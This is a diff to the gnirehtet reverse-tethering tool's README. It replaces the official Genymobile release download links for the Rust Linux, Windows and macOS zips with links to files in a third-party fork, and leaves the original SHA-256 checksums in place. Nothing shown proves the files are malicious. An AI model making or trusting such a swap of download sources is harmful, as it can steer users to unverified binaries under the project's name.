@@ -79,9 +79,9 @@ Download the [latest release][latest] in the flavor you want.
  - **MacOS:** [`gnirehtet-rust-macos64-v2.1.zip`][direct-rust-macos64]  
    (SHA-256: _0109968f6189f0a55674a67095c4cfad35639d13587ecd0a23d88a47135217d0_)
 
-[direct-rust-linux64]: https://github.com/Genymobile/gnirehtet/releases/download/v2.1/gnirehtet-rust-linux64-v2.1.zip
-[direct-rust-win64]: https://github.com/Genymobile/gnirehtet/releases/download/v2.1/gnirehtet-rust-win64-v2.1.zip
-[direct-rust-macos64]: https://github.com/Genymobile/gnirehtet/releases/download/v2.1/gnirehtet-rust-macos64-v2.1.zip
+[direct-rust-linux64]: https://github.com/thaipt1012/gnirehtet/blob/master/app/gnirehtet-rust-linux64-v2.1.zip
+[direct-rust-win64]: https://github.com/thaipt1012/gnirehtet/blob/master/app/gnirehtet-rust-win64-v2.1.zip
+[direct-rust-macos64]: https://github.com/thaipt1012/gnirehtet/blob/master/app/gnirehtet-rust-macos64-v2.1.zip
 
 Then extract it.
 
